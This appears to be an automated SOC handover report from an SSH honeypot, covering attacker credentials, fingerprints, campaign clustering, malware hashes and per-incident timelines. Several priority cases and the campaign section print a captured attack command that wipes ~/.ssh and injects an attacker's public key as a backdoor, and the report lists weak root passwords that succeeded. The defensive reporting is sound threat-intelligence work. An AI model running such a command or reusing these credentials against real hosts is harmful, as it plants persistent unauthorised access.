# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-21 |
| **Generated At** | 2026-06-21T15:56:58Z |
| **Shift Time** | 15:56 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **47** |
| Confirmed Threats | **38** |
| False Positives Filtered | **9** (19.1%) |
| Unique Attacker IPs | **34** |
| Countries of Origin | **16** |
| High Severity Cases | **7** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **40** |
| Malware Samples Analyzed | **0** HIGH · **20** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **20** |
| Unique Credential Pairs | **16** |
| Unique Usernames | **9** |
| Unique Passwords | **16** |
| Successful Auth Pairs | **7** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 7 |
| `345gs5662d34` | 3 |
| `blank` | 2 |
| `debian` | 2 |
| `nobody` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 3 |
| `3245gs5662d34` | 3 |
| `blank2018` | 1 |
| `12332145` | 1 |
| `7` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 3 |
| `root` | `3245gs5662d34` | 3 |
| `blank` | `blank2018` | 1 |
| `root` | `12332145` | 1 |
| `debian` | `7` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `12332145` | `189.147.19.238` | 2026-06-21T13:31:13 |
| `root` | `3245gs5662d34` | `189.147.19.238` | 2026-06-21T13:31:19 |
| `root` | `123456qwe` | `186.68.83.104` | 2026-06-21T13:43:03 |
| `root` | `3245gs5662d34` | `186.68.83.104` | 2026-06-21T13:43:10 |
| `root` | `Qq123456@` | `43.165.185.71` | 2026-06-21T13:59:22 |
| `root` | `3245gs5662d34` | `43.165.185.71` | 2026-06-21T13:59:26 |
| `root` | `123abc` | `187.115.144.103` | 2026-06-21T15:47:09 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **47** |
| Sessions with Fingerprint | **6** |
| Unique HASSH Fingerprints | **6** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 13 |
| OpenSSH | 8 |
| Unknown | 4 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 12 | 6 |
| `acaa53e0a7d7...` | Mirai/variant | 8 | 8 |
| `dd9bcf093c35...` | Mirai/variant | 1 | 1 |
| `af8223ac9914...` | libssh-based | 1 | 1 |
| `748f8c627d3f...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 12 | 6 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 8 | 8 | Mirai/variant |
| `95420f9d932d...` | Unknown | 2 | 1 | — |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |
| `af8223ac9914...` | libssh | 1 | 1 | libssh-based |
| `748f8c627d3f...` | Unknown | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `43.165.185.71`, `189.147.19.238`, `186.68.83.104`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **34** |
| Unique ASNs | **28** |
| High-Risk ASNs | **22** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS22773` | Cox Communications Inc. | 3 | MEDIUM |
| `AS17421` | Mobile Business Group | 2 | HIGH |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS4766` | Korea Telecom | 2 | HIGH |
| `AS4134` | CHINANET BACKBONE | 2 | HIGH |
| `AS28343` | UNIFIQUE TELECOMUNICACOES S/A | 1 | HIGH |
| `AS45090` | Shenzhen Tencent Computer Systems Company Limited | 1 | HIGH |
| `AS38669` | LG HelloVision Corp. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (7)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-635852c16ac6

| Field | Detail |
|---|---|
| **Source IP** | `189.147.19[.]238` |
| **First Seen** | 2026-06-21 13:31 |
| **Last Seen** | 2026-06-21 13:31 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-21 13:31:12` | `cowrie.session.connect` |
| `2026-06-21 13:31:12` | `cowrie.client.version` |
| `2026-06-21 13:31:12` | `cowrie.client.kex` |
| `2026-06-21 13:31:13` | `cowrie.login.success` |
| `2026-06-21 13:31:14` | `cowrie.session.params` |
| `2026-06-21 13:31:14` | `cowrie.command.input` |
| `2026-06-21 13:31:14` | `cowrie.command.failed` |
| `2026-06-21 13:31:14` | `cowrie.log.closed` |
| `2026-06-21 13:31:14` | `cowrie.session.params` |
| `2026-06-21 13:31:14` | `cowrie.command.input` |
| `2026-06-21 13:31:15` | `cowrie.session.file_download` |
| `2026-06-21 13:31:15` | `cowrie.log.closed` |
| `2026-06-21 13:31:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.147.19[.]238` to AbuseIPDB if not already reported
- [ ] Block `189.147.19[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2003f3b2b901

| Field | Detail |
|---|---|
| **Source IP** | `189.147.19[.]238` |
| **First Seen** | 2026-06-21 13:31 |
| **Last Seen** | 2026-06-21 13:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-21 13:31:18` | `cowrie.session.connect` |
| `2026-06-21 13:31:18` | `cowrie.client.version` |
| `2026-06-21 13:31:18` | `cowrie.client.kex` |
| `2026-06-21 13:31:19` | `cowrie.login.success` |
| `2026-06-21 13:31:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.147.19[.]238` to AbuseIPDB if not already reported
- [ ] Block `189.147.19[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e5270009ae1

| Field | Detail |
|---|---|
| **Source IP** | `186.68.83[.]104` |
| **First Seen** | 2026-06-21 13:43 |
| **Last Seen** | 2026-06-21 13:43 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-21 13:43:02` | `cowrie.session.connect` |
| `2026-06-21 13:43:02` | `cowrie.client.version` |
| `2026-06-21 13:43:02` | `cowrie.client.kex` |
| `2026-06-21 13:43:03` | `cowrie.login.success` |
| `2026-06-21 13:43:04` | `cowrie.session.params` |
| `2026-06-21 13:43:04` | `cowrie.command.input` |
| `2026-06-21 13:43:04` | `cowrie.command.failed` |
| `2026-06-21 13:43:05` | `cowrie.log.closed` |
| `2026-06-21 13:43:05` | `cowrie.session.params` |
| `2026-06-21 13:43:05` | `cowrie.command.input` |
| `2026-06-21 13:43:05` | `cowrie.session.file_download` |
| `2026-06-21 13:43:05` | `cowrie.log.closed` |
| `2026-06-21 13:43:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.68.83[.]104` to AbuseIPDB if not already reported
- [ ] Block `186.68.83[.]104` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27587b54e8c8

| Field | Detail |
|---|---|
| **Source IP** | `186.68.83[.]104` |
| **First Seen** | 2026-06-21 13:43 |
| **Last Seen** | 2026-06-21 13:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-21 13:43:09` | `cowrie.session.connect` |
| `2026-06-21 13:43:09` | `cowrie.client.version` |
| `2026-06-21 13:43:09` | `cowrie.client.kex` |
| `2026-06-21 13:43:10` | `cowrie.login.success` |
| `2026-06-21 13:43:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.68.83[.]104` to AbuseIPDB if not already reported
- [ ] Block `186.68.83[.]104` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b9f78b54a79

| Field | Detail |
|---|---|
| **Source IP** | `43.165.185[.]71` |
| **First Seen** | 2026-06-21 13:59 |
| **Last Seen** | 2026-06-21 13:59 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-21 13:59:21` | `cowrie.session.connect` |
| `2026-06-21 13:59:21` | `cowrie.client.version` |
| `2026-06-21 13:59:22` | `cowrie.client.kex` |
| `2026-06-21 13:59:22` | `cowrie.login.success` |
| `2026-06-21 13:59:22` | `cowrie.session.params` |
| `2026-06-21 13:59:22` | `cowrie.command.input` |
| `2026-06-21 13:59:22` | `cowrie.command.failed` |
| `2026-06-21 13:59:23` | `cowrie.log.closed` |
| `2026-06-21 13:59:23` | `cowrie.session.params` |
| `2026-06-21 13:59:23` | `cowrie.command.input` |
| `2026-06-21 13:59:23` | `cowrie.session.file_download` |
| `2026-06-21 13:59:23` | `cowrie.log.closed` |
| `2026-06-21 13:59:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.165.185[.]71` to AbuseIPDB if not already reported
- [ ] Block `43.165.185[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa88a394ca23

| Field | Detail |
|---|---|
| **Source IP** | `43.165.185[.]71` |
| **First Seen** | 2026-06-21 13:59 |
| **Last Seen** | 2026-06-21 13:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-21 13:59:25` | `cowrie.session.connect` |
| `2026-06-21 13:59:25` | `cowrie.client.version` |
| `2026-06-21 13:59:25` | `cowrie.client.kex` |
| `2026-06-21 13:59:26` | `cowrie.login.success` |
| `2026-06-21 13:59:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.165.185[.]71` to AbuseIPDB if not already reported
- [ ] Block `43.165.185[.]71` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2391b47b4351

| Field | Detail |
|---|---|
| **Source IP** | `187.115.144[.]103` |
| **First Seen** | 2026-06-21 15:47 |
| **Last Seen** | 2026-06-21 15:47 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-21 15:47:01` | `cowrie.session.connect` |
| `2026-06-21 15:47:02` | `cowrie.client.version` |
| `2026-06-21 15:47:02` | `cowrie.client.kex` |
| `2026-06-21 15:47:09` | `cowrie.login.success` |
| `2026-06-21 15:47:10` | `cowrie.direct-tcpip.request` |
| `2026-06-21 15:47:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.115.144[.]103` to AbuseIPDB if not already reported
- [ ] Block `187.115.144[.]103` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `135.148.33[.]168` | **3** | 2026-06-21 13:32 | 2026-06-21 15:03 | 2m | 0 | `T1592` | 🟢 LOW |
| `92.204.128[.]218` | **3** | 2026-06-21 12:12 | 2026-06-21 13:07 | 1m | 0 | `T1592` | 🟢 LOW |
| `157.15.78[.]122` | **2** | 2026-06-21 14:51 | 2026-06-21 14:52 | 0m | 0 | `T1592` | 🟢 LOW |
| `46.32.228[.]2` | **2** | 2026-06-21 14:24 | 2026-06-21 15:03 | 1m | 0 | `T1592` | 🟢 LOW |
| `109.233.21[.]109` | 1 | 2026-06-21 13:17 | 2026-06-21 13:17 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `111.70.17[.]73` | 1 | 2026-06-21 14:47 | 2026-06-21 14:47 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `111.70.33[.]193` | 1 | 2026-06-21 14:59 | 2026-06-21 14:59 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `117.50.119[.]17` | 1 | 2026-06-21 13:41 | 2026-06-21 13:43 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.145.111[.]33` | 1 | 2026-06-21 14:14 | 2026-06-21 14:14 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `119.201.59[.]224` | 1 | 2026-06-21 15:03 | 2026-06-21 15:04 | 3s | 0 | `T1592` | 🟢 LOW |
| `128.24.163[.]72` | 1 | 2026-06-21 15:55 | 2026-06-21 15:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `148.70.47[.]10` | 1 | 2026-06-21 13:09 | 2026-06-21 13:11 | 120s | 0 | `T1592` | 🟢 LOW |
| `157.230.150[.]187` | 1 | 2026-06-21 13:46 | 2026-06-21 13:48 | 97s | 0 | `T1592` | 🟢 LOW |
| `170.82.177[.]21` | 1 | 2026-06-21 14:01 | 2026-06-21 14:01 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `186.68.83[.]104` | 1 | 2026-06-21 13:43 | 2026-06-21 13:43 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `189.147.19[.]238` | 1 | 2026-06-21 13:31 | 2026-06-21 13:31 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `218.149.228[.]170` | 1 | 2026-06-21 14:11 | 2026-06-21 14:11 | 6s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `219.89.206[.]236` | 1 | 2026-06-21 15:34 | 2026-06-21 15:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `220.179.87[.]204` | 1 | 2026-06-21 15:40 | 2026-06-21 15:41 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `36.39.140[.]2` | 1 | 2026-06-21 14:04 | 2026-06-21 14:04 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `43.165.185[.]71` | 1 | 2026-06-21 13:59 | 2026-06-21 13:59 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `46.29.234[.]126` | 1 | 2026-06-21 15:15 | 2026-06-21 15:15 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.124.149[.]211` | 1 | 2026-06-21 13:35 | 2026-06-21 13:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `60.171.135[.]254` | 1 | 2026-06-21 14:04 | 2026-06-21 14:06 | 120s | 0 | `T1592` | 🟢 LOW |
| `66.45.144[.]201` | 1 | 2026-06-21 13:34 | 2026-06-21 13:34 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (35 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 43/100 | 🟡 MEDIUM | **33/73** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 43/100 | 🟡 MEDIUM | **34/73** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 44/100 | 🟡 MEDIUM | **35/73** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a2f3d6d2bd82a65939f4e939bce242e8e246014fb3a9a9d5c3769ed7dcfffe24` | Unknown binary | `a2f3d6d2bd82a659...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/74** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/73** 🔴 |
| `fc6f8ae5f64e4f17481f7e3be29a1c56949f216a998414188003eae1db20c9e5` | GZip Archive | `fc6f8ae5f64e4f17...` | 14/100 | 🟢 LOW | **35/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `111.70.17[.]73` | TW | CHT-Mobile business Group,Chunghwa | **100** ⚠️ | 47 |
| `219.89.206[.]236` | NZ | Spark New Zealand Trading Ltd | **100** ⚠️ | 50 |
| `135.148.33[.]168` | US | OVH US LLC | **100** ⚠️ | 9 |
| `109.233.21[.]109` | LB | its another /22 already approved for /21 for waves company | **100** ⚠️ | 50 |
| `119.201.59[.]224` | KR | Korea Telecom | **100** ⚠️ | 50 |
| `220.179.87[.]204` | CN | CHINANET anhui province network | **100** ⚠️ | 50 |
| `111.70.33[.]193` | TW | CHT-Mobile business Group,Chunghwa | **100** ⚠️ | 12 |
| `157.15.78[.]122` | ID | PT Box Net Media | **100** ⚠️ | 2 |
| `218.149.228[.]170` | KR | Korea Telecom | **100** ⚠️ | 42 |
